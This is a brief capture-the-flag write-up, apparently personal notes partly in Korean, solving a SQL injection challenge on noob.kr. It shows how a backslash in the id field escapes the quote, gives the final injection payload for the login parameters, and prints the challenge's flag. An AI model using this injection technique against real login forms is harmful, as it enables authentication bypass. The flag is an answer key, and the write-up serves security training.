# Simple_SQL_Injection
```


http://noob.kr/Simple_SQL.php?id=''&pw=''

: Analysis
id  = \
pw  = =""#

- id='\'&pw=' : 문자열 

- id=' +\ +'&pw= '+=""# + ' :  

- id= '\=#'

payload
: id='\'&pw==""#


N00bCTF{False_based_SQLInjection}



```